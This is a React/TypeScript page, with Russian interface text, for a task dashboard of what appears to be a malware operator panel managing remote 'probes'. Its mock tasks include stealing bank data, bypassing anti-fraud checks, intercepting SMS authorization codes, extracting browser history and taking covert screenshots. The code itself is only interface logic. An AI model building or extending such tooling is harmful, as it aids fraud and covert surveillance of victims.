import React, { useState } from 'react';
import styled from 'styled-components';

// Типы
enum TaskPriority {
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL'
}

enum TaskStatus {
  PENDING = 'PENDING',
  IN_PROGRESS = 'IN_PROGRESS',
  COMPLETED = 'COMPLETED',
  FAILED = 'FAILED',
  CANCELED = 'CANCELED'
}

interface Task {
  id: string;
  title: string;
  description: string;
  zondId: string;
  status: TaskStatus;
  priority: TaskPriority;
  createdAt: string;
  updatedAt: string;
  completedAt?: string;
  progress: number;
  assignedTo?: string;
  type: string;
  tags: string[];
}

// Стили
const Container = styled.div`
  padding: 20px 0;
`;

const Title = styled.h1`
  font-size: 1.8rem;
  margin-bottom: 20px;
  color: ${props => props.theme.text.primary};
`;

const ControlPanel = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
`;

const SearchAndFilters = styled.div`
  display: flex;
  gap: 15px;
`;

const SearchInput = styled.input`
  padding: 10px 15px;
  border-radius: 4px;
  border: 1px solid ${props => props.theme.border.primary};
  background-color: ${props => props.theme.bg.input};
  color: ${props => props.theme.text.primary};
  width: 300px;
  
  &::placeholder {
    color: ${props => props.theme.text.placeholder};
  }
`;

const FilterSelect = styled.select`
  padding: 10px 15px;
  border-radius: 4px;
  border: 1px solid ${props => props.theme.border.primary};
  background-color: ${props => props.theme.bg.input};
  color: ${props => props.theme.text.primary};
  
  &:focus {
    outline: none;
    border-color: ${props => props.theme.accent.primary};
  }
`;

const Button = styled.button<{variant?: 'primary' | 'secondary' | 'danger'}>`
  padding: 10px 15px;
  border-radius: 4px;
  border: none;
  cursor: pointer;
  font-weight: 500;
  
  background-color: ${props => 
    props.variant === 'danger' ? props.theme.danger :
    props.variant === 'secondary' ? props.theme.bg.tertiary :
    props.theme.accent.primary
  };
  
  color: ${props => 
    props.variant === 'secondary' ? props.theme.text.primary :
    'white'
  };
  
  &:hover {
    opacity: 0.9;
  }
  
  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const TaskGrid = styled.div`
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 20px;
  margin-bottom: 30px;
`;

const TaskCard = styled.div`
  background-color: ${props => props.theme.bg.secondary};
  border-radius: 8px;
  padding: 16px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
  position: relative;
  overflow: hidden;
`;

const TaskHeader = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: flex-start;
  margin-bottom: 16px;
`;

const TaskTitle = styled.h3`
  font-size: 1.1rem;
  font-weight: 600;
  color: ${props => props.theme.text.primary};
  margin: 0;
`;

const TaskDescription = styled.p`
  font-size: 0.9rem;
  color: ${props => props.theme.text.secondary};
  margin-bottom: 16px;
  line-height: 1.4;
  max-height: 2.8em;
  overflow: hidden;
  text-overflow: ellipsis;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
`;

const TaskInfo = styled.div`
  display: flex;
  flex-direction: column;
  gap: 10px;
  margin-bottom: 16px;
`;

const TaskInfoRow = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 0.85rem;
`;

const TaskLabel = styled.span`
  color: ${props => props.theme.text.secondary};
`;

const TaskValue = styled.span`
  color: ${props => props.theme.text.primary};
  font-weight: 500;
`;

const ProgressBarContainer = styled.div`
  width: 100%;
  height: 6px;
  background-color: ${props => props.theme.bg.tertiary};
  border-radius: 3px;
  overflow: hidden;
  margin-bottom: 16px;
`;

const ProgressBar = styled.div<{progress: number; status: TaskStatus}>`
  height: 100%;
  width: ${props => props.progress}%;
  background-color: ${props => 
    props.status === TaskStatus.FAILED ? props.theme.danger :
    props.status === TaskStatus.COMPLETED ? props.theme.success :
    props.status === TaskStatus.IN_PROGRESS ? props.theme.accent.primary :
    props.status === TaskStatus.CANCELED ? props.theme.text.secondary :
    props.theme.warning
  };
  transition: width 0.3s ease;
`;

const TaskActions = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
`;

const ActionButton = styled.button<{variant?: 'primary' | 'secondary' | 'danger'}>`
  padding: 6px 12px;
  border-radius: 4px;
  border: none;
  cursor: pointer;
  font-size: 0.85rem;
  font-weight: 500;
  
  background-color: ${props => 
    props.variant === 'danger' ? props.theme.danger :
    props.variant === 'secondary' ? props.theme.bg.tertiary :
    props.theme.accent.primary
  };
  
  color: ${props => 
    props.variant === 'secondary' ? props.theme.text.primary :
    'white'
  };
  
  &:hover {
    opacity: 0.9;
  }
  
  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const TagsContainer = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-bottom: 16px;
`;

const Tag = styled.span`
  padding: 4px 8px;
  border-radius: 12px;
  font-size: 0.7rem;
  font-weight: 500;
  background-color: ${props => props.theme.bg.tertiary};
  color: ${props => props.theme.text.secondary};
`;

const StatusBadge = styled.span<{status: TaskStatus}>`
  padding: 4px 8px;
  border-radius: 12px;
  font-size: 0.75rem;
  font-weight: 500;
  
  background-color: ${props => 
    props.status === TaskStatus.COMPLETED ? 'rgba(16, 185, 129, 0.1)' :
    props.status === TaskStatus.IN_PROGRESS ? 'rgba(14, 165, 233, 0.1)' :
    props.status === TaskStatus.FAILED ? 'rgba(239, 68, 68, 0.1)' :
    props.status === TaskStatus.CANCELED ? 'rgba(107, 114, 128, 0.1)' :
    'rgba(245, 158, 11, 0.1)'
  };
  
  color: ${props => 
    props.status === TaskStatus.COMPLETED ? props.theme.success :
    props.status === TaskStatus.IN_PROGRESS ? props.theme.accent.primary :
    props.status === TaskStatus.FAILED ? props.theme.danger :
    props.status === TaskStatus.CANCELED ? props.theme.text.secondary :
    props.theme.warning
  };
`;

const PriorityIndicator = styled.div<{priority: TaskPriority}>`
  width: 4px;
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  background-color: ${props => 
    props.priority === TaskPriority.CRITICAL ? props.theme.danger :
    props.priority === TaskPriority.HIGH ? props.theme.warning :
    props.priority === TaskPriority.MEDIUM ? props.theme.accent.primary :
    props.theme.success
  };
`;

const Pagination = styled.div`
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 10px;
  margin-bottom: 20px;
`;

const PageButton = styled.button<{active?: boolean}>`
  width: 36px;
  height: 36px;
  border-radius: 4px;
  border: 1px solid ${props => props.active ? props.theme.accent.primary : props.theme.border.primary};
  background-color: ${props => props.active ? props.theme.accent.primary : 'transparent'};
  color: ${props => props.active ? 'white' : props.theme.text.primary};
  cursor: pointer;
  
  &:hover {
    border-color: ${props => props.theme.accent.primary};
  }
  
  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const TasksPage: React.FC = () => {
  // Состояния
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [priorityFilter, setPriorityFilter] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  
  // Моковые данные задач
  const tasksData: Task[] = [
    {
      id: 'task-001',
      title: 'Сбор данных банковского клиента',
      description: 'Получение информации о транзакциях и балансе счетов пользователя',
      zondId: 'zond-005',
      status: TaskStatus.IN_PROGRESS,
      priority: TaskPriority.HIGH,
      createdAt: '2023-10-01T10:30:00Z',
      updatedAt: '2023-10-01T12:45:00Z',
      progress: 65,
      assignedTo: 'Agent #12',
      type: 'data_collection',
      tags: ['финансы', 'банк', 'приоритетно']
    },
    {
      id: 'task-002',
      title: 'Обход аутентификации ATS',
      description: 'Обойти систему защиты антифрод в системе онлайн-банкинга',
      zondId: 'zond-012',
      status: TaskStatus.COMPLETED,
      priority: TaskPriority.CRITICAL,
      createdAt: '2023-09-28T09:15:00Z',
      updatedAt: '2023-09-29T18:20:00Z',
      completedAt: '2023-09-29T18:20:00Z',
      progress: 100,
      assignedTo: 'Agent #8',
      type: 'security_bypass',
      tags: ['безопасность', 'антифрод', 'критично']
    },
    {
      id: 'task-003',
      title: 'Анализ уязвимостей веб-приложения',
      description: 'Сканирование и выявление потенциальных уязвимостей в целевом веб-приложении',
      zondId: 'zond-003',
      status: TaskStatus.PENDING,
      priority: TaskPriority.MEDIUM,
      createdAt: '2023-10-05T14:00:00Z',
      updatedAt: '2023-10-05T14:00:00Z',
      progress: 0,
      type: 'vulnerability_scan',
      tags: ['сканирование', 'веб', 'уязвимости']
    },
    {
      id: 'task-004',
      title: 'Извлечение истории браузера',
      description: 'Получение истории посещенных сайтов и поисковых запросов из браузеров пользователя',
      zondId: 'zond-008',
      status: TaskStatus.FAILED,
      priority: TaskPriority.LOW,
      createdAt: '2023-10-02T11:45:00Z',
      updatedAt: '2023-10-03T09:30:00Z',
      progress: 35,
      assignedTo: 'Agent #5',
      type: 'data_extraction',
      tags: ['браузер', 'история', 'метаданные']
    },
    {
      id: 'task-005',
      title: 'Перехват SMS-сообщений',
      description: 'Настройка перехвата и отправки всех входящих SMS с кодами авторизации',
      zondId: 'zond-017',
      status: TaskStatus.IN_PROGRESS,
      priority: TaskPriority.HIGH,
      createdAt: '2023-10-06T08:20:00Z',
      updatedAt: '2023-10-06T13:15:00Z',
      progress: 75,
      assignedTo: 'Agent #11',
      type: 'interception',
      tags: ['SMS', 'перехват', 'коды']
    },
    {
      id: 'task-006',
      title: 'Фоновый скриншот каждые 15 минут',
      description: 'Создание скриншотов экрана пользователя каждые 15 минут в режиме скрытого выполнения',
      zondId: 'zond-001',
      status: TaskStatus.COMPLETED,
      priority: TaskPriority.MEDIUM,
      createdAt: '2023-09-25T10:00:00Z',
      updatedAt: '2023-10-05T19:00:00Z',
      completedAt: '2023-10-05T19:00:00Z',
      progress: 100,
      assignedTo: 'Agent #3',
      type: 'surveillance',
      tags: ['скриншоты', 'мониторинг', 'длительная задача']
    }
  ];
  
  // Функции форматирования данных
  const formatDate = (dateString: string): string => {
    const date = new Date(dateString);
    return new Intl.DateTimeFormat('ru-RU', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };
  
  const getStatusText = (status: TaskStatus): string => {
    switch(status) {
      case TaskStatus.PENDING: return 'Ожидает';
      case TaskStatus.IN_PROGRESS: return 'Выполняется';
      case TaskStatus.COMPLETED: return 'Завершено';
      case TaskStatus.FAILED: return 'Ошибка';
      case TaskStatus.CANCELED: return 'Отменено';
      default: return 'Неизвестно';
    }
  };
  
  const getPriorityText = (priority: TaskPriority): string => {
    switch(priority) {
      case TaskPriority.LOW: return 'Низкий';
      case TaskPriority.MEDIUM: return 'Средний';
      case TaskPriority.HIGH: return 'Высокий';
      case TaskPriority.CRITICAL: return 'Критический';
      default: return 'Неизвестно';
    }
  };
  
  // Фильтрация задач
  const filteredTasks = tasksData.filter(task => {
    // Поиск по названию и описанию
    const matchesSearch = task.title.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          task.description.toLowerCase().includes(searchQuery.toLowerCase());
    
    // Фильтр по статусу
    const matchesStatus = statusFilter === 'all' || task.status === statusFilter;
    
    // Фильтр по приоритету
    const matchesPriority = priorityFilter === 'all' || task.priority === priorityFilter;
    
    return matchesSearch && matchesStatus && matchesPriority;
  });
  
  // Обработчики событий
  const handleSearchChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setSearchQuery(e.target.value);
  };
  
  const handleStatusFilterChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setStatusFilter(e.target.value);
  };
  
  const handlePriorityFilterChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setPriorityFilter(e.target.value);
  };
  
  const handleCreateTask = () => {
    console.log('Создание новой задачи');
    // Здесь будет логика создания новой задачи
  };
  
  const handleCancelTask = (id: string) => {
    if (window.confirm('Вы уверены, что хотите отменить эту задачу?')) {
      console.log(`Отмена задачи с ID: ${id}`);
      // Здесь будет логика отмены задачи
    }
  };
  
  const handleViewDetails = (id: string) => {
    console.log(`Просмотр деталей задачи с ID: ${id}`);
    // Здесь будет логика просмотра деталей задачи
  };
  
  return (
    <Container>
      <Title>Управление задачами</Title>
      
      {/* Панель управления */}
      <ControlPanel>
        <SearchAndFilters>
          <SearchInput 
            type="text" 
            placeholder="Поиск по названию или описанию" 
            value={searchQuery}
            onChange={handleSearchChange}
          />
          <FilterSelect value={statusFilter} onChange={handleStatusFilterChange}>
            <option value="all">Все статусы</option>
            <option value={TaskStatus.PENDING}>Ожидающие</option>
            <option value={TaskStatus.IN_PROGRESS}>Выполняются</option>
            <option value={TaskStatus.COMPLETED}>Завершенные</option>
            <option value={TaskStatus.FAILED}>С ошибками</option>
            <option value={TaskStatus.CANCELED}>Отмененные</option>
          </FilterSelect>
          <FilterSelect value={priorityFilter} onChange={handlePriorityFilterChange}>
            <option value="all">Все приоритеты</option>
            <option value={TaskPriority.LOW}>Низкий</option>
            <option value={TaskPriority.MEDIUM}>Средний</option>
            <option value={TaskPriority.HIGH}>Высокий</option>
            <option value={TaskPriority.CRITICAL}>Критический</option>
          </FilterSelect>
        </SearchAndFilters>
        
        <Button onClick={handleCreateTask}>Создать задачу</Button>
      </ControlPanel>
      
      {/* Сетка задач */}
      <TaskGrid>
        {filteredTasks.map(task => (
          <TaskCard key={task.id}>
            <PriorityIndicator priority={task.priority} />
            
            <TaskHeader>
              <TaskTitle>{task.title}</TaskTitle>
              <StatusBadge status={task.status}>{getStatusText(task.status)}</StatusBadge>
            </TaskHeader>
            
            <TaskDescription>{task.description}</TaskDescription>
            
            <TagsContainer>
              {task.tags.map((tag, index) => (
                <Tag key={index}>{tag}</Tag>
              ))}
            </TagsContainer>
            
            <TaskInfo>
              <TaskInfoRow>
                <TaskLabel>Зонд:</TaskLabel>
                <TaskValue>{task.zondId}</TaskValue>
              </TaskInfoRow>
              <TaskInfoRow>
                <TaskLabel>Приоритет:</TaskLabel>
                <TaskValue>{getPriorityText(task.priority)}</TaskValue>
              </TaskInfoRow>
              <TaskInfoRow>
                <TaskLabel>Создано:</TaskLabel>
                <TaskValue>{formatDate(task.createdAt)}</TaskValue>
              </TaskInfoRow>
              <TaskInfoRow>
                <TaskLabel>Исполнитель:</TaskLabel>
                <TaskValue>{task.assignedTo || 'Не назначен'}</TaskValue>
              </TaskInfoRow>
            </TaskInfo>
            
            <ProgressBarContainer>
              <ProgressBar progress={task.progress} status={task.status} />
            </ProgressBarContainer>
            
            <TaskActions>
              <ActionButton 
                variant="primary" 
                onClick={() => handleViewDetails(task.id)}
              >
                Детали
              </ActionButton>
              
              {task.status === TaskStatus.PENDING || task.status === TaskStatus.IN_PROGRESS ? (
                <ActionButton 
                  variant="danger" 
                  onClick={() => handleCancelTask(task.id)}
                >
                  Отменить
                </ActionButton>
              ) : (
                <ActionButton 
                  variant="secondary" 
                  onClick={() => console.log(`Повторить задачу ${task.id}`)}
                >
                  Повторить
                </ActionButton>
              )}
            </TaskActions>
          </TaskCard>
        ))}
      </TaskGrid>
      
      {/* Пагинация */}
      <Pagination>
        <PageButton disabled={currentPage === 1} onClick={() => setCurrentPage(prev => Math.max(prev - 1, 1))}>
          &lt;
        </PageButton>
        <PageButton active={currentPage === 1} onClick={() => setCurrentPage(1)}>1</PageButton>
        <PageButton active={currentPage === 2} onClick={() => setCurrentPage(2)}>2</PageButton>
        <PageButton active={currentPage === 3} onClick={() => setCurrentPage(3)}>3</PageButton>
        <PageButton disabled={currentPage === 3} onClick={() => setCurrentPage(prev => Math.min(prev + 1, 3))}>
          &gt;
        </PageButton>
      </Pagination>
    </Container>
  );
};

export default TasksPage; 